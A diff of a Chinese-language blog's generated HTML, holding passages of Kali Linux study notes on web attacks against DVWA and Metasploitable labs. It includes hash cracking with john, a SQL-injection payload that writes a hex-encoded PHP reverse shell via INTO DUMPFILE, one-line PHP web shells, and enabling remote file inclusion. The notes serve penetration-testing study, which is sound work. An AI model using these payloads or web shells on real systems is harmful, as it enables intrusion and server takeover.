+<li>–purge-output（清除output文件夹）</li>
+<li>–smart（当有大量检测目标时，只选择基于错误的检测结果）</li>
+<li>–wizard（sqlmap向导）</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -559,7 +1136,7 @@
 </ul>
 </li>
 <li>VMware Tools vs Open-VM-Tools<ul>
-<li>apt-get install open-vm-tools-desktop fuse</li>
+<li><strong><code>🔺命令：apt-get install open-vm-tools-desktop fuse</code></strong></li>
 </ul>
 </li>
 <li>Gnome 3.18</li>
@@ -790,11 +1367,11 @@ lsb_release -a</code></pre></blockquote>
 </li>
 <li>密码破解<ul>
 <li>username:passhash–&gt;dvwa.txt</li>
-<li>john –format=raw-MD5 dvwa.txt（存在./john文件）</li>
+<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt</code></strong>（存在./john文件）</li>
 </ul>
 </li>
 <li>显示之前破解的密码<ul>
-<li>john –format=raw-MD5 dvwa.txt –show</li>
+<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt --show</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -813,8 +1390,8 @@ lsb_release -a</code></pre></blockquote>
 </ul>
 </li>
 <li>写入文件（十六进制模式）<ul>
-<li>cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</li>
-<li>cat php-reverse-shell.php | xxd -ps | tr -d ‘\n’（▲ 十六进制编码的shell）</li>
+<li><strong><code>🔺命令：cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</code></strong></li>
+<li><strong><code>🔺命令：cat php-reverse-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></strong>（▲ 十六进制编码的shell）</li>
 <li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
 <li>可能受到服务器GET大小的限制，传输不成功</li>
 </ul>
@@ -1319,8 +1896,8 @@ Host：123
 ?&gt;</code></pre></blockquote>
 <h4 id="3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell"><a href="#3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell" class="headerlink" title="3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell"></a>3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell</h4><ul>
 <li>PHP反弹shell<ul>
-<li>cp  /usr/share/webshells/php/php-reverse-shell.php ./3.php</li>
-<li>vi 3.php</li>
+<li><strong><code>🔺命令：cp  /usr/share/webshells/php/php-reverse-shell.php ./3.php</code></strong></li>
+<li><strong><code>🔺命令：vi 3.php</code></strong></li>
 <li>修改反弹Shell的ip</li>
 <li>3.php的内容加在POST中的body部分</li>
 <li>nc 侦听端口</li>
@@ -1334,7 +1911,7 @@ Host：123
 </ul>
 </li>
 <li>写入WebShell<ul>
-<li>echo “<?php \$cmd=\$_GET["cmd"];system(\$cmd);?>“ &gt; /var/www/2.php（\用于避免$后面的变量过滤）</li>
+<li><strong><code>🔺命令：echo &quot;&lt;?php \$cmd=\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; /var/www/2.php</code></strong>（\用于避免$后面的变量过滤）</li>
 </ul>
 </li>
 </ul>
@@ -1480,7 +2057,8 @@ Host：123
         
           
             <hr>
-<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><pre><code>- &lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;</code></pre><ul>
+<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><ul>
+<li><?php echo shell_exec($_GET['cmd']);?></li>
 <li>直接上传webshell</li>
 <li>修改文件类型上传webshell<ul>
 <li>Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg）</li>
@@ -1495,7 +2073,7 @@ Host：123
 <li>上传目录权限（上传权限限制，限制上传文件执行）</li>
 <li>DVWA的Upload（low）：<ul>
 <li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
-<li>2.vi 1.php（<?php echo shell_exec($_GET['cmd']);?>）</li>
+<li>2.<strong><code>🔺命令：vi 1.php</code></strong>（<?php echo shell_exec($_GET['cmd']);?>）</li>
 <li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
 <li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
 </ul>
@@ -1685,9 +2263,9 @@ Host：123
 ▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
 <ul>
 <li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
-<li>sudo vi /etc/php5/cgi/php.ini</li>
+<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
 <li>allow_url_include=On</li>
-<li>sudo /etc/init.d/apache2 restart</li>
+<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
 </ul>
 </li>
 <li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
@@ -2560,259 +3138,6 @@ Grid：分布式，多个Dispatcher，网格类型</code></pre></blockquote>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/" itemprop="url">Kali Linux笔记(四十二)：OWASP_ZAP</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-29T10:51:56+08:00">
-                2019-12-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-OWASP-ZAP"><a href="#1-OWASP-ZAP" class="headerlink" title="1. OWASP_ZAP"></a>1. OWASP_ZAP</h4><ul>
-<li>Zed attack proxy</li>
-<li>WEB Application集成渗透测试和漏洞挖掘工具</li>
-<li>开源免费跨平台简单易用</li>
-<li>截断代理（自动配置端口）</li>
-<li>主动（Quick Start/站点目录 → 攻击 → Active Scan）</li>
-<li>被动扫描（手动爬网，截断代理）</li>
-<li>Fuzzy（工具 → Fuzz/Request → 选择 → 右键 → Fuzz）▲ 注意File Fuzzers</li>
-<li>暴力破解（站点目录 → Request → 选择 → 右键 → Fuzz → Payload(字典文件)）</li>
-<li>API（必须使用了OWASP_ZAP代理的情况下）<ul>
-<li><a href="http://zap/" target="_blank" rel="noopener">http://zap/</a></li>
-</ul>
-</li>
-</ul>
-<h4 id="2-OWASP-ZAP"><a href="#2-OWASP-ZAP" class="headerlink" title="2. OWASP_ZAP"></a>2. OWASP_ZAP</h4><ul>
-<li>Persist Session</li>
-<li>Mode<ul>
-<li>Safe（安全扫描，不包含危险扫描）</li>
-<li>Protected（指定Web Application进行危险扫描）</li>
-<li>Standard（标准扫描，存在一些危险扫描，可能造成破坏）</li>
-<li>ATTACK（能扫就扫，能有多强烈就多强烈）</li>
-</ul>
-</li>
-<li>升级Add-ones</li>
-<li>Anti CSRF Tokens（每次访问，随机生成一个Token → 防止CSRF/重放攻击）</li>
-</ul>
-<blockquote>
-<pre><code>▲ 一般情况下，虽然Tokens是变化的，但Tokens的头部是一般是固定不变的，可以添加到OWASP_ZAP中，可以做到重放攻击
-设置Options → Anti CSRF Tokens → Add（Tokens的名字）</code></pre></blockquote>
-<ul>
-<li>https–CA（增加OWASP_ZAP自签名证书）</li>
-</ul>
-<blockquote>
-<pre><code>▲ 设置Options → Dynamic SSL Certificates → 保存（cet证书） → 安装证书</code></pre></blockquote>
-<ul>
-<li>Scope/Cpntexts/Filter</li>
-<li>Http Sessions–default session tokens &amp; site session tokes</li>
-<li>Note/tag</li>
-<li>Passive Scan</li>
-</ul>
-<h4 id="3-OWASP-ZAP-Session"><a href="#3-OWASP-ZAP-Session" class="headerlink" title="3. OWASP_ZAP Session"></a>3. OWASP_ZAP Session</h4><ul>
-<li>persist the ZAP Session（文件 → 打开会话）<ul>
-<li>current timestamp（保存默认的ZAP目录）</li>
-<li>specify the name and location（长久保存自定义目录）</li>
-<li>not persist the ZAP Session（不长久保存）</li>
-</ul>
-</li>
-<li>Request/Response</li>
-<li>手动爬网 → OWASP_ZAP分析 </li>
-</ul>
-<h4 id="4-OWASP-ZAP-Manage-Add-ones"><a href="#4-OWASP-ZAP-Manage-Add-ones" class="headerlink" title="4. OWASP_ZAP Manage Add-ones"></a>4. OWASP_ZAP Manage Add-ones</h4><ul>
-<li>Installed（版本更新可能需要到Github）<ul>
-<li>Uninstall Selected</li>
-<li>Update Selected</li>
-</ul>
-</li>
-<li>Marketplace<ul>
-<li>Release（长期使用，正式发布）</li>
-<li>Beta（测试使用，较正式发布）</li>
-<li>Alpha（不是成熟的版本，稳定性准备性不是很高）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-OWASP-ZAP-policy"><a href="#5-OWASP-ZAP-policy" class="headerlink" title="5. OWASP_ZAP policy"></a>5. OWASP_ZAP policy</h4><ul>
-<li>General<ul>
-<li>添加策略</li>
-<li>Name</li>
-<li>Default Alert Threshold（报警阈值，一般选中等）</li>
-<li>Default Attack Strength（攻击强度）</li>
-</ul>
-</li>
-<li>信息收集</li>
-<li>客户端浏览器</li>
-<li>服务器安全</li>
-<li>杂项</li>
-<li>注入</li>
-</ul>
-<h4 id="6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）"><a href="#6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）" class="headerlink" title="6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）"></a>6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）</h4><ul>
-<li>站点目录 → Include in Context → New context</li>
-<li>Scope包含Context，可以删除一个Context</li>
-<li>同一个范围Scope同一个策略</li>
-</ul>
-<h4 id="7-OWASP-ZAP-Http-Session"><a href="#7-OWASP-ZAP-Http-Session" class="headerlink" title="7. OWASP_ZAP Http Session"></a>7. OWASP_ZAP Http Session</h4><ul>
-<li>工具栏 → Session Properties<ul>
-<li>针对不同Context有不同的Authentication</li>
-<li>默认Manual Authentication（记录访问过网站的Session，手动输入记录）</li>
-<li>支持表单、HTTP Basic、Sript-Base</li>
-</ul>
-</li>
-<li>站点 → 加号 → 新建脚本</li>
-<li>选项 → Http Session → 增加Web Application自定义的Session </li>
-</ul>
-<h4 id="8-OWASP-ZAP-编码解码哈希"><a href="#8-OWASP-ZAP-编码解码哈希" class="headerlink" title="8. OWASP_ZAP 编码解码哈希"></a>8. OWASP_ZAP 编码解码哈希</h4><ul>
-<li>选择编码的字段或要编码的字段 → 右键选择</li>
-</ul>
-<blockquote>
-<pre><code>SHA1 -- 彩虹表，统计哈希值对应的值</code></pre></blockquote>
-<h4 id="9-OWASP-ZAP-截断"><a href="#9-OWASP-ZAP-截断" class="headerlink" title="9. OWASP_ZAP 截断"></a>9. OWASP_ZAP 截断</h4><ul>
-<li>工具栏 → Set break on all requests and responses</li>
-<li>单步截断/一次截断</li>
-<li>▲ 显示隐藏域（小灯泡）– 代理服务器修改返回的内容后返回给浏览器</li>
-</ul>
-<h4 id="10-OWASP-ZAP"><a href="#10-OWASP-ZAP" class="headerlink" title="10. OWASP_ZAP"></a>10. OWASP_ZAP</h4><ul>
-<li>标准扫描工作流程<ul>
-<li>设置代理</li>
-<li>手动爬网</li>
-<li>自动爬网（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → 爬网/Forced Browser site/Forced Browser directory/Forced Browser directory(and children)）</li>
-<li>主动扫描（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → Active Scan）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2867,7 +3192,7 @@ Grid：分布式，多个Dispatcher，网格类型</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-count">58</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
